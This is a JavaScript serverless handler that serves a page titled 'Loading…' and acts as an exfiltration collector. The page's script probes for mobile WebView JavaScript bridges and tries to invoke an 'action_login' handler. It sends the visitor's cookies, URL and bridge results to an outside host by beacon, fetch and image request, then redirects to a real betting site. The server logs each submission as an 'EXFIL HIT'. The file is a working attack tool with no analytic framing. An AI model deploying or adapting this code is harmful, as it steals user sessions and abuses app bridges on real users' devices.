const HITS = [];

function clientIp(req) {
  const xff = req.headers['x-forwarded-for'];
  return xff ? String(xff).split(',')[0].trim() : (req.socket && req.socket.remoteAddress) || 'unknown';
}

module.exports = async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', '*');
  if (req.method === 'OPTIONS') return res.status(204).end();

  if (req.method === 'POST') {
    let body = '';
    await new Promise((resolve) => {
      req.on('data', (c) => { body += c; if (body.length > 2e6) req.destroy(); });
      req.on('end', resolve);
      req.on('error', resolve);
    });
    let payload = body;
    if (payload.startsWith('d=')) {
      try { payload = decodeURIComponent(payload.slice(2)); } catch (e) {}
    }
    const hit = { t: new Date().toISOString(), ip: clientIp(req), ua: req.headers['user-agent'], referer: req.headers['referer'] || '', body: payload };
    HITS.push(hit);
    console.log('=== EXFIL HIT ===', JSON.stringify(hit));
    return res.status(200).json({ ok: true });
  }

  if (req.query && req.query.d) {
    let payload = String(req.query.d);
    try { payload = decodeURIComponent(payload); } catch (e) {}
    const hit = { t: new Date().toISOString(), ip: clientIp(req), ua: req.headers['user-agent'], referer: req.headers['referer'] || '', body: payload };
    HITS.push(hit);
    console.log('=== EXFIL BEACON ===', JSON.stringify(hit));
    const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
    res.setHeader('Content-Type', 'image/gif');
    res.setHeader('Cache-Control', 'no-store');
    return res.status(200).send(gif);
  }

  const html = `<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Loading…</title></head>
<body style="background:#111;color:#0f0;font-family:monospace;font-size:12px;padding:12px">
<pre id="o">initializing…</pre>
<script>
(function(){
  var EXFIL = 'https://haxor-net.vercel.app/api';
  var OUT = document.getElementById('o');
  var log = [];
  function L(k,v){ log.push(k+': '+v); try{OUT.textContent=log.join('\\n')}catch(e){} }

  function exfil(data) {
    try { navigator.sendBeacon(EXFIL, JSON.stringify(data)); } catch(e){}
    try { fetch(EXFIL, { method:'POST', mode:'no-cors', body:JSON.stringify(data), keepalive:true }).catch(function(){}); } catch(e){}
    try { (new Image()).src = EXFIL + '?d=' + encodeURIComponent(JSON.stringify(data).slice(0,1800)) + '&_=' + Date.now(); } catch(e){}
  }

  var attempts = 0;
  var maxAttempts = 20;
  var bridgeFound = false;

  function tryBridge() {
    attempts++;
    var found = [];
    var names = ['WebViewJavascriptBridge','WebviewJsBridge','action_login',
      'AndroidBridge','Android','jsBridge','JsBridge','JSBridge','nativeBridge',
      'bridge','webviewBridge','WebViewBridge','__native__','__bridge__'];

    names.forEach(function(n) {
      try { if (window[n]) found.push(n); } catch(e){}
    });

    if (found.length > 0) {
      bridgeFound = true;
      L('bridge found', found.join(','));
      var result = {
        ts: new Date().toISOString(),
        url: location.href,
        origin: location.origin,
        cookie: document.cookie,
        cookie_len: document.cookie.length,
        bridges: found,
        action_login_result: null
      };

      found.forEach(function(n) {
        var b = window[n];
        if (!b) return;
        var methods = ['callHandler','postMessage','call','send','invoke','exec'];
        methods.forEach(function(m) {
          if (typeof b[m] !== 'function') return;
          try {
            b[m]('action_login', JSON.stringify({
              userId: 'PROBE_USER_ID',
              accessToken: 'PROBE_AT',
              refreshToken: 'PROBE_RT'
            }), function(resp) {
              result.action_login_result = n+'.'+m+' callback:' + JSON.stringify(resp);
              exfil(result);
            });
            result.action_login_result = n+'.'+m+' sent';
            return;
          } catch(e) {
            result.action_login_result = n+'.'+m+' err:'+e;
          }
        });
      });

      exfil(result);
      return;
    }

    if (attempts >= maxAttempts) {
      L('no bridge after', maxAttempts + ' attempts');
      var finalResult = {
        ts: new Date().toISOString(),
        url: location.href,
        origin: location.origin,
        cookie: document.cookie,
        cookie_len: document.cookie.length,
        bridges: [],
        action_login_result: 'no_bridge_on_external_page',
        note: 'Bridge not injected into external pages. Redirecting to msport.com where bridge IS available.'
      };
      exfil(finalResult);
      L('redirecting', 'to msport.com');
      window.location.replace('https://www.msport.com/');
      return;
    }

    L('polling', attempts + '/' + maxAttempts);
    setTimeout(tryBridge, 500);
  }

  L('origin', location.origin);
  L('cookie_len', document.cookie.length);
  tryBridge();
})();
</script></body></html>`;

  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.setHeader('Cache-Control', 'no-store');
  return res.status(200).send(html);
};
